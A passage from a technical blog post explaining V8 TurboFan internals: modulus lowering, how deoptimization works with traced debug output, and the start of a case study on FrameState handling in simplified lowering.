  <span class="n">Node</span><span class="o">*</span> <span class="k">const</span> <span class="n">minus_one</span> <span class="o">=</span> <span class="n">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Int32Constant</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="n">Node</span><span class="o">*</span> <span class="k">const</span> <span class="n">zero</span> <span class="o">=</span> <span class="n">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Uint32Constant</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">Node</span><span class="o">*</span> <span class="k">const</span> <span class="n">lhs</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="n">left</span><span class="p">().</span><span class="n">node</span><span class="p">();</span>
  <span class="n">Node</span><span class="o">*</span> <span class="k">const</span> <span class="n">rhs</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="n">right</span><span class="p">().</span><span class="n">node</span><span class="p">();</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">right</span><span class="p">().</span><span class="n">Is</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">zero</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">right</span><span class="p">().</span><span class="n">HasValue</span><span class="p">())</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">machine</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Uint32Mod</span><span class="p">(),</span> <span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">,</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">start</span><span class="p">());</span>
  <span class="p">}</span>

  <span class="c1">// General case for unsigned integer modulus, with optimization for (unknown)</span>
  <span class="c1">// power of 2 right hand side.</span>
  <span class="c1">//</span>
  <span class="c1">//   if rhs == 0 then</span>
  <span class="c1">//     zero</span>
  <span class="c1">//   else</span>
  <span class="c1">//     msk = rhs - 1</span>
  <span class="c1">//     if rhs &amp; msk != 0 then</span>
  <span class="c1">//       lhs % rhs</span>
  <span class="c1">//     else</span>
  <span class="c1">//       lhs &amp; msk</span>
  <span class="c1">//</span>
  <span class="c1">// Note: We do not use the Diamond helper class here, because it really hurts</span>
  <span class="c1">// readability with nested diamonds.</span>
  <span class="k">const</span> <span class="n">Operator</span><span class="o">*</span> <span class="k">const</span> <span class="n">merge_op</span> <span class="o">=</span> <span class="n">common</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Merge</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
  <span class="k">const</span> <span class="n">Operator</span><span class="o">*</span> <span class="k">const</span> <span class="n">phi_op</span> <span class="o">=</span>
      <span class="n">common</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Phi</span><span class="p">(</span><span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kWord32</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

  <span class="n">Node</span><span class="o">*</span> <span class="n">check0</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">machine</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Word32Equal</span><span class="p">(),</span> <span class="n">rhs</span><span class="p">,</span> <span class="n">zero</span><span class="p">);</span>
  <span class="n">Node</span><span class="o">*</span> <span class="n">branch0</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">common</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Branch</span><span class="p">(</span><span class="n">BranchHint</span><span class="o">::</span><span class="n">kFalse</span><span class="p">),</span> <span class="n">check0</span><span class="p">,</span>
                                   <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">start</span><span class="p">());</span>

  <span class="n">Node</span><span class="o">*</span> <span class="n">if_true0</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">common</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">IfTrue</span><span class="p">(),</span> <span class="n">branch0</span><span class="p">);</span>
  <span class="n">Node</span><span class="o">*</span> <span class="n">true0</span> <span class="o">=</span> <span class="n">zero</span><span class="p">;</span>

  <span class="n">Node</span><span class="o">*</span> <span class="n">if_false0</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">common</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">IfFalse</span><span class="p">(),</span> <span class="n">branch0</span><span class="p">);</span>
  <span class="n">Node</span><span class="o">*</span> <span class="n">false0</span><span class="p">;</span>
  <span class="p">{</span>
    <span class="n">Node</span><span class="o">*</span> <span class="n">msk</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">machine</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Int32Add</span><span class="p">(),</span> <span class="n">rhs</span><span class="p">,</span> <span class="n">minus_one</span><span class="p">);</span>

    <span class="n">Node</span><span class="o">*</span> <span class="n">check1</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">machine</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Word32And</span><span class="p">(),</span> <span class="n">rhs</span><span class="p">,</span> <span class="n">msk</span><span class="p">);</span>
    <span class="n">Node</span><span class="o">*</span> <span class="n">branch1</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">common</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Branch</span><span class="p">(),</span> <span class="n">check1</span><span class="p">,</span> <span class="n">if_false0</span><span class="p">);</span>

    <span class="n">Node</span><span class="o">*</span> <span class="n">if_true1</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">common</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">IfTrue</span><span class="p">(),</span> <span class="n">branch1</span><span class="p">);</span>
    <span class="n">Node</span><span class="o">*</span> <span class="n">true1</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">machine</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Uint32Mod</span><span class="p">(),</span> <span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">,</span> <span class="n">if_true1</span><span class="p">);</span>

    <span class="n">Node</span><span class="o">*</span> <span class="n">if_false1</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">common</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">IfFalse</span><span class="p">(),</span> <span class="n">branch1</span><span class="p">);</span>
    <span class="n">Node</span><span class="o">*</span> <span class="n">false1</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">machine</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Word32And</span><span class="p">(),</span> <span class="n">lhs</span><span class="p">,</span> <span class="n">msk</span><span class="p">);</span>

    <span class="n">if_false0</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">merge_op</span><span class="p">,</span> <span class="n">if_true1</span><span class="p">,</span> <span class="n">if_false1</span><span class="p">);</span>
    <span class="n">false0</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">phi_op</span><span class="p">,</span> <span class="n">true1</span><span class="p">,</span> <span class="n">false1</span><span class="p">,</span> <span class="n">if_false0</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">Node</span><span class="o">*</span> <span class="n">merge0</span> <span class="o">=</span> <span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">merge_op</span><span class="p">,</span> <span class="n">if_true0</span><span class="p">,</span> <span class="n">if_false0</span><span class="p">);</span>
  <span class="k">return</span> <span class="nf">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">phi_op</span><span class="p">,</span> <span class="n">true0</span><span class="p">,</span> <span class="n">false0</span><span class="p">,</span> <span class="n">merge0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<h3 id="a-high-level-overview-of-deoptimization">A high level overview of deoptimization</h3>
<p>Understanding deoptimization requires to study several components of V8 : </p>
<ul>
<li>instruction selection<ul>
<li>when descriptors for FrameState and StateValues nodes are built</li>
</ul>
</li>
<li>code generation <ul>
<li>when deoptimization input data are built (that includes a <code>Translation</code>)</li>
</ul>
</li>
<li>the deoptimizer<ul>
<li>at runtime, this is where execution is redirected to when "bailing out to deoptimization"</li>
<li>uses the <code>Translation</code></li>
<li><em>translates</em> from the current input frame (optimized native code) to the output interpreted frame (interpreted ignition bytecode)</li>
</ul>
</li>
</ul>
<p>When looking at the sea of nodes in Turbolizer, you may see different kind of nodes related to deoptimization such as :</p>
<ul>
<li>Checkpoint<ul>
<li>refers to a FrameState</li>
</ul>
</li>
<li>FrameState<ul>
<li>refers to a position and a state, takes StateValues as inputs</li>
</ul>
</li>
<li>StateValues<ul>
<li>state of parameters, local variables, accumulator</li>
</ul>
</li>
<li>Deoptimize / DeoptimizeIf / DeoptimizeUnless etc</li>
</ul>
<p>There are several types of deoptimization : </p>
<ul>
<li>eager, when you deoptimize the current function on the spot<ul>
<li>you just triggered a type guard (ex: wrong map, thanks to a CheckMaps node)</li>
</ul>
</li>
<li>lazy, you deoptimize later<ul>
<li>another function just violated a code dependency (ex: a function call just made a map unstable, violating a stable map dependency)</li>
</ul>
</li>
<li>soft<ul>
<li>a function got optimized too early, more feedback is needed</li>
</ul>
</li>
</ul>
<p>We are only discussing the case where optimized assembly code deoptimizes to ignition interpreted bytecode, that is the constructed output frame is called an <code>interpreted frame</code>. However, there are other kinds of frames we are not going to discuss in this article (ex: adaptor frames, builtin continuation frames, etc). Michael Stanton, a V8 dev, <a href="https://ripsawridge.github.io/">wrote a few interesting blog posts you may want to check</a>.</p>
<p>We know that javascript first gets translated to ignition bytecode (and a feedback vector is associated to that bytecode). Then, TurboFan might kick in and generate optimized code based on speculations (using the aforementioned feedback vector). It associates <code>deoptimization input data</code> to this optimized code.
When executing optimized code, if an assumption is violated (let's say, a type guard for instance), the flow of execution gets redirected to the deoptimizer. The <code>deoptimizer</code> takes those <code>deoptimization input data</code> to translate the current <code>input frame</code> and compute an <code>output frame</code>. The deoptimization input data tell the deoptimizer what kind of deoptimization is to be done (for instance, are we going back to some standard ignition bytecode? That implies building an <code>interpreted frame</code> as an output frame). They also indicate where to deoptimize to (such as the bytecode offset), what values to put in the output frame and how to <code>translate</code> them. Finally, once everything is ready, it returns to the ignition interpreter.</p>
<!--<center>![deopt_full](\images\deopt_full.png)</center>-->
<p><center><img src="\images\deopt_full.png" width="90%"></img></center></p>
<p>During <code>code generation</code>, for every instruction that has a flag indicating a possible deoptimization, a branch is generated. It either branches to a continuation block (normal execution) or to a <code>deoptimization exit</code> to which is attached a <code>Translation</code>.</p>
<!--<center>![assemble_code_deopt](\images\assemble_code_deopt.png)</center>-->
<p><center><img src="\images\assemble_code_deopt.png" width="70%"></img></center></p>
<p>To build the translation, code generation uses information from structures such as a <code>FrameStateDescriptor</code> and a list of <code>StateValueDescriptor</code>. They obviously correspond to <code>FrameState</code> and <code>StateValues</code> nodes. Those structures are built during <code>instruction selection</code>, not when visiting those nodes (no code generation is directly associated to those nodes, therefore they don't have associated visitors in the instruction selector).</p>
<!--<center>![translation](\images\translation.png)</center>-->
<p><center><img src="\images\translation.png" width="90%"></img></center></p>
<h4 id="tracing-a-deoptimization">Tracing a deoptimization</h4>
<p>Let's get through a quick experiment using the following script.</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span> <span class="nx">add_prop</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
<span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">obj</span><span class="p">[</span><span class="nx">x</span><span class="p">]</span> <span class="o">=</span> <span class="mi">42</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">add_prop</span><span class="p">(</span><span class="s2">&quot;x&quot;</span><span class="p">);</span>
<span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">add_prop</span><span class="p">);</span>
<span class="nx">add_prop</span><span class="p">(</span><span class="s2">&quot;x&quot;</span><span class="p">);</span>
<span class="nx">add_prop</span><span class="p">(</span><span class="s2">&quot;x&quot;</span><span class="p">);</span>
<span class="nx">add_prop</span><span class="p">(</span><span class="s2">&quot;x&quot;</span><span class="p">);</span>
<span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">add_prop</span><span class="p">);</span>
<span class="nx">add_prop</span><span class="p">(</span><span class="s2">&quot;x&quot;</span><span class="p">);</span>
<span class="nx">add_prop</span><span class="p">(</span><span class="s2">&quot;different&quot;</span><span class="p">);</span>
</code></pre></div>

<p>Now run it using <code>--turbo-profiling</code> and <code>--print-code-verbose</code>.</p>
<p>This allows to dump the deoptimization input data : </p>
<div class="highlight"><pre><span></span><code>Deoptimization Input Data (deopt points = 5)
 index  bytecode-offset    pc  commands
     0                0   269  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=0, function=0x3ee5e83df701 &lt;String[#8]: add_prop&gt;, height=1, retval=@0(#0)}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-2}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x3ee5f5180df9 &lt;Odd Oddball: optimized_out&gt;)}
                               LITERAL {literal_id=2 (0x3ee5f5180df9 &lt;Odd Oddball: optimized_out&gt;)}

// ...

     4                6    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=6, function=0x3ee5e83df701 &lt;String[#8]: add_prop&gt;, height=1, retval=@0(#0)}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-2}
                               REGISTER {input=rcx}
                               STACK_SLOT {input=4}
                               CAPTURED_OBJECT {length=7}
                               LITERAL {literal_id=3 (0x3ee5301c0439 &lt;Map(HOLEY_ELEMENTS)&gt;)}
                               LITERAL {literal_id=4 (0x3ee5f5180c01 &lt;FixedArray[0]&gt;)}
                               LITERAL {literal_id=4 (0x3ee5f5180c01 &lt;FixedArray[0]&gt;)}
                               LITERAL {literal_id=5 (0x3ee5f51804b1 &lt;undefined&gt;)}
                               LITERAL {literal_id=5 (0x3ee5f51804b1 &lt;undefined&gt;)}
                               LITERAL {literal_id=5 (0x3ee5f51804b1 &lt;undefined&gt;)}
                               LITERAL {literal_id=5 (0x3ee5f51804b1 &lt;undefined&gt;)}
                               LITERAL {literal_id=6 (42)}
</code></pre></div>

<p>And we also see the code used to bail out to deoptimization (notice that the deopt index matches with the index of a translation in the deoptimization input data).</p>
<div class="highlight"><pre><span></span><code>// trimmed / simplified output
nop
REX.W movq r13,0x0       ;; debug: deopt position, script offset &#39;17&#39;
                         ;; debug: deopt position, inlining id &#39;-1&#39;
                         ;; debug: deopt reason &#39;(unknown)&#39;
                         ;; debug: deopt index 0
call 0x55807c02040       ;; lazy deoptimization bailout
// ...
REX.W movq r13,0x4       ;; debug: deopt position, script offset &#39;44&#39;
                         ;; debug: deopt position, inlining id &#39;-1&#39;
                         ;; debug: deopt reason &#39;wrong name&#39;
                         ;; debug: deopt index 4
call 0x55807bc2040       ;; eager deoptimization bailout
nop
</code></pre></div>

<blockquote>
<p>Interestingly (you'll need to also add the <code>--code-comments</code> flag), we can notice that the beginning of an native turbofan compiled function starts with a check for any required lazy deoptimization! </p>
</blockquote>
<div class="highlight"><pre><span></span><code>                  -- Prologue: check for deoptimization --
0x1332e5442b44    24  488b59e0       REX.W movq rbx,[rcx-0x20]
0x1332e5442b48    28  f6430f01       testb [rbx+0xf],0x1
0x1332e5442b4c    2c  740d           jz 0x1332e5442b5b  &lt;+0x3b&gt;
                  -- Inlined Trampoline to CompileLazyDeoptimizedCode --
0x1332e5442b4e    2e  49ba6096371501000000 REX.W movq r10,0x115379660  (CompileLazyDeoptimizedCode)    ;; off heap target
0x1332e5442b58    38  41ffe2         jmp r10
</code></pre></div>

<p>Now let's trace the actual deoptimization with <code>--trace-deopt</code>. We can see the deoptimization reason : wrong name. Because the feedback indicates that we always add a property named "x", TurboFan then speculates it will always be the case. Thus, executing optimized code with any different name will violate this assumption and trigger a deoptimization.</p>
<div class="highlight"><pre><span></span><code>[deoptimizing (DEOPT eager): begin 0x0a6842edfa99 &lt;JSFunction add_prop (sfi = 0xa6842edf881)&gt; (opt #0) @2, FP to SP delta: 24, caller sp: 0x7ffeeb82e3b0]
            ;;; deoptimize at &lt;test.js:3:8&gt;, wrong name
</code></pre></div>

<p>It displays the input frame.</p>
<div class="highlight"><pre><span></span><code>  reading input frame add_prop =&gt; bytecode_offset=6, args=2, height=1, retval=0(#0); inputs:
      0: 0x0a6842edfa99 ;  [fp -  16]  0x0a6842edfa99 &lt;JSFunction add_prop (sfi = 0xa6842edf881)&gt;
      1: 0x0a6876381579 ;  [fp +  24]  0x0a6876381579 &lt;JSGlobal Object&gt;
      2: 0x0a6842edf7a9 ; rdx 0x0a6842edf7a9 &lt;String[#9]: different&gt;
      3: 0x0a6842ec1831 ;  [fp -  24]  0x0a6842ec1831 &lt;NativeContext[244]&gt;
      4: captured object #0 (length = 7)
           0x0a68d4640439 ; (literal  3) 0x0a68d4640439 &lt;Map(HOLEY_ELEMENTS)&gt;
           0x0a6893080c01 ; (literal  4) 0x0a6893080c01 &lt;FixedArray[0]&gt;
           0x0a6893080c01 ; (literal  4) 0x0a6893080c01 &lt;FixedArray[0]&gt;
           0x0a68930804b1 ; (literal  5) 0x0a68930804b1 &lt;undefined&gt;
           0x0a68930804b1 ; (literal  5) 0x0a68930804b1 &lt;undefined&gt;
           0x0a68930804b1 ; (literal  5) 0x0a68930804b1 &lt;undefined&gt;
           0x0a68930804b1 ; (literal  5) 0x0a68930804b1 &lt;undefined&gt;
      5: 0x002a00000000 ; (literal  6) 42
</code></pre></div>

<p>The deoptimizer uses the translation at index 2 of deoptimization data.</p>
<div class="highlight"><pre><span></span><code>     2                6    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=6, function=0x3ee5e83df701 &lt;String[#8]: add_prop&gt;, height=1, retval=@0(#0)}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-2}
                               REGISTER {input=rdx}
                               STACK_SLOT {input=4}
                               CAPTURED_OBJECT {length=7}
                               LITERAL {literal_id=3 (0x3ee5301c0439 &lt;Map(HOLEY_ELEMENTS)&gt;)}
                               LITERAL {literal_id=4 (0x3ee5f5180c01 &lt;FixedArray[0]&gt;)}
                               LITERAL {literal_id=4 (0x3ee5f5180c01 &lt;FixedArray[0]&gt;)}
                               LITERAL {literal_id=5 (0x3ee5f51804b1 &lt;undefined&gt;)}
                               LITERAL {literal_id=5 (0x3ee5f51804b1 &lt;undefined&gt;)}
                               LITERAL {literal_id=5 (0x3ee5f51804b1 &lt;undefined&gt;)}
                               LITERAL {literal_id=5 (0x3ee5f51804b1 &lt;undefined&gt;)}
                               LITERAL {literal_id=6 (42)}
</code></pre></div>

<p>And displays the translated interpreted frame.</p>
<div class="highlight"><pre><span></span><code>  translating interpreted frame add_prop =&gt; bytecode_offset=6, variable_frame_size=16, frame_size=80
    0x7ffeeb82e3a8: [top +  72] &lt;- 0x0a6876381579 &lt;JSGlobal Object&gt; ;  stack parameter (input #1)
    0x7ffeeb82e3a0: [top +  64] &lt;- 0x0a6842edf7a9 &lt;String[#9]: different&gt; ;  stack parameter (input #2)
    -------------------------
    0x7ffeeb82e398: [top +  56] &lt;- 0x000105d9e4d2 ;  caller&#39;s pc
    0x7ffeeb82e390: [top +  48] &lt;- 0x7ffeeb82e3f0 ;  caller&#39;s fp
    0x7ffeeb82e388: [top +  40] &lt;- 0x0a6842ec1831 &lt;NativeContext[244]&gt; ;  context (input #3)
    0x7ffeeb82e380: [top +  32] &lt;- 0x0a6842edfa99 &lt;JSFunction add_prop (sfi = 0xa6842edf881)&gt; ;  function (input #0)
    0x7ffeeb82e378: [top +  24] &lt;- 0x0a6842edfbd1 &lt;BytecodeArray[12]&gt; ;  bytecode array
    0x7ffeeb82e370: [top +  16] &lt;- 0x003b00000000 &lt;Smi 59&gt; ;  bytecode offset
    -------------------------
    0x7ffeeb82e368: [top +   8] &lt;- 0x0a6893080c11 &lt;Odd Oddball: arguments_marker&gt; ;  stack parameter (input #4)
    0x7ffeeb82e360: [top +   0] &lt;- 0x002a00000000 &lt;Smi 42&gt; ;  accumulator (input #5)
</code></pre></div>

<p>After that, it is ready to redirect the execution to the ignition interpreter.</p>
<div class="highlight"><pre><span></span><code>[deoptimizing (eager): end 0x0a6842edfa99 &lt;JSFunction add_prop (sfi = 0xa6842edf881)&gt; @2 =&gt; node=6, pc=0x000105d9e9a0, caller sp=0x7ffeeb82e3b0, took 2.698 ms]
Materialization [0x7ffeeb82e368] &lt;- 0x0a6842ee0031 ;  0x0a6842ee0031 &lt;Object map = 0xa68d4640439&gt;
</code></pre></div>

<h2 id="case-study-an-incorrect-bigint-rematerialization">Case study : an incorrect BigInt rematerialization</h2>
<h3 id="back-to-simplified-lowering">Back to simplified lowering</h3>
<p>Let's have a look at the way <code>FrameState</code> nodes are dealt with during the simplified lowering phase.</p>
<p><code>FrameState</code> nodes expect 6 inputs : </p>
<ol>
<li>parameters<ul>
<li><code>UseInfo</code> is <code>AnyTagged</code></li>
</ul>
</li>
<li>registers<ul>
<li><code>UseInfo</code> is <code>AnyTagged</code></li>
</ul>
</li>
<li>the accumulator<ul>
<li><code>UseInfo</code> is <code>Any</code></li>
</ul>
</li>
<li>a context<ul>
<li><code>UseInfo</code> is <code>AnyTagged</code></li>
</ul>
</li>
<li>a closure<ul>
<li><code>UseInfo</code> is <code>AnyTagged</code></li>
</ul>
</li>
<li>the outer frame state<ul>
<li><code>UseInfo</code> is <code>AnyTagged</code></li>
</ul>
</li>
</ol>
<p>A <code>FrameState</code> has a <code>tagged</code> output representation.</p>
<div class="highlight"><pre><span></span><code>  <span class="kt">void</span> <span class="nf">VisitFrameState</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">ValueInputCount</span><span class="p">());</span>
    <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">OperatorProperties</span><span class="o">::</span><span class="n">GetFrameStateInputCount</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">()));</span>

    <span class="n">ProcessInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">UseInfo</span><span class="o">::</span><span class="n">AnyTagged</span><span class="p">());</span>  <span class="c1">// Parameters.</span>
    <span class="n">ProcessInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">UseInfo</span><span class="o">::</span><span class="n">AnyTagged</span><span class="p">());</span>  <span class="c1">// Registers.</span>

    <span class="c1">// Accumulator is a special flower - we need to remember its type in</span>
    <span class="c1">// a singleton typed-state-values node (as if it was a singleton</span>
    <span class="c1">// state-values node).</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">propagate</span><span class="p">())</span> <span class="p">{</span>
      <span class="n">EnqueueInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">UseInfo</span><span class="o">::</span><span class="n">Any</span><span class="p">());</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">())</span> <span class="p">{</span>
      <span class="n">Zone</span><span class="o">*</span> <span class="n">zone</span> <span class="o">=</span> <span class="n">jsgraph_</span><span class="o">-&gt;</span><span class="n">zone</span><span class="p">();</span>
      <span class="n">Node</span><span class="o">*</span> <span class="n">accumulator</span> <span class="o">=</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">InputAt</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">accumulator</span> <span class="o">==</span> <span class="n">jsgraph_</span><span class="o">-&gt;</span><span class="n">OptimizedOutConstant</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">node</span><span class="o">-&gt;</span><span class="n">ReplaceInput</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">jsgraph_</span><span class="o">-&gt;</span><span class="n">SingleDeadTypedStateValues</span><span class="p">());</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">ZoneVector</span><span class="o">&lt;</span><span class="n">MachineType</span><span class="o">&gt;*</span> <span class="n">types</span> <span class="o">=</span>
            <span class="k">new</span> <span class="p">(</span><span class="n">zone</span><span class="o">-&gt;</span><span class="n">New</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">ZoneVector</span><span class="o">&lt;</span><span class="n">MachineType</span><span class="o">&gt;</span><span class="p">)))</span>
                <span class="n">ZoneVector</span><span class="o">&lt;</span><span class="n">MachineType</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">zone</span><span class="p">);</span>
        <span class="p">(</span><span class="o">*</span><span class="n">types</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">DeoptMachineTypeOf</span><span class="p">(</span><span class="n">GetInfo</span><span class="p">(</span><span class="n">accumulator</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">representation</span><span class="p">(),</span>
                                         <span class="n">TypeOf</span><span class="p">(</span><span class="n">accumulator</span><span class="p">));</span>

        <span class="n">node</span><span class="o">-&gt;</span><span class="n">ReplaceInput</span><span class="p">(</span>
            <span class="mi">2</span><span class="p">,</span> <span class="n">jsgraph_</span><span class="o">-&gt;</span><span class="n">graph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNode</span><span class="p">(</span><span class="n">jsgraph_</span><span class="o">-&gt;</span><span class="n">common</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">TypedStateValues</span><span class="p">(</span>
                                              <span class="n">types</span><span class="p">,</span> <span class="n">SparseInputMask</span><span class="o">::</span><span class="n">Dense</span><span class="p">()),</span>
                                          <span class="n">accumulator</span><span class="p">));</span>
      <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">ProcessInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">UseInfo</span><span class="o">::</span><span class="n">AnyTagged</span><span class="p">());</span>  <span class="c1">// Context.</span>
    <span class="n">ProcessInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">UseInfo</span><span class="o">::</span><span class="n">AnyTagged</span><span class="p">());</span>  <span class="c1">// Closure.</span>
    <span class="n">ProcessInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">UseInfo</span><span class="o">::</span><span class="n">AnyTagged</span><span class="p">());</span>  <span class="c1">// Outer frame state.</span>
    <span class="k">return</span> <span class="n">SetOutput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kTagged</span><span class="p">);</span>
  <span class="p">}</span>
</code></pre></div>

<p>An input node for which the use info is <code>AnyTagged</code> means this input is being used as a <code>tagged</code> value and that the truncation kind is <code>any</code> i.e. no truncation is required (although it may be required to distinguish between zeros).</p>
<p>An input node for which the use info is <code>Any</code> means the input is being used as <em>any</em> kind of value and that the truncation kind is <code>any</code>.  No truncation is needed. The input representation is undetermined. That is the most generic case.</p>
<div class="highlight"><pre><span></span><code><span class="c1">// The {UseInfo} class is used to describe a use of an input of a node. </span>

  <span class="k">static</span> <span class="n">UseInfo</span> <span class="nf">AnyTagged</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">UseInfo</span><span class="p">(</span><span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kTagged</span><span class="p">,</span> <span class="n">Truncation</span><span class="o">::</span><span class="n">Any</span><span class="p">());</span>
  <span class="p">}</span>
  <span class="c1">// Undetermined representation.</span>
  <span class="k">static</span> <span class="n">UseInfo</span> <span class="nf">Any</span><span class="p">()</span> <span class="p">{</span>
